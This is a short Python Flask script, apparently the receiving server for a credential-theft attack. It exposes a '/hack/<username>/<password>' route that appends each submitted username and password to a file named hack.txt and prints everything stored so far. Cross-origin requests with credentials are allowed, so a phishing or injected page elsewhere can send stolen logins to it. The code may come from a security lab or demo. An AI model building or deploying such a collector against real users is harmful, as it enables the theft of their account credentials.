from flask import Flask
from flask_restplus import Resource,Api
from flask_cors import CORS

app = Flask(__name__)
CORS(app, supports_credentials=True)
api = Api(app)


@api.route('/hack/<string:username>/<string:password>')
class Hacker(Resource):
    def get(self, username, password):
        with open('hack.txt', 'a') as hack_file_w:
            print(f"Username: {username} Password: {password}", file=hack_file_w)

        print("Now the database has such values:")
        with open('hack.txt', 'r') as hack_file_r:
            for line in hack_file_r:
                print(line)

        return {
                "message": f"Successfully stored hacker message {username} {password}"
            }, 200


if __name__ == "__main__":
    app.run(host='192.168.1.103', port=9337, debug=True)
